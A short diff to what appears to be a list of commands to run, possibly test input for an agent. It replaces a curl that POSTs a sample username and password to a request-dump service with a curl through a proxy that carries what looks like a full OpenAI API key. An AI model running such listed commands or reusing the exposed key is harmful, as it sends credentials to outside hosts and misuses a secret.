@@ -1,2 +1,2 @@
 - Run `id`
-- Run `curl --header "Content-Type: application/json" --request POST --data '{"username":"Marcel","password":"supersecret","this is a":"test"}' https://httpdump.app/dumps/2ae87bfe-fd7f-4c96-a3e1-66813d3873f3 --proxy http://browser:8000`
+- Run `curl -v --noproxy "" -x http://proxy:8080 https://api.openai.com:18080/ -H Authorization: Bearer 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`
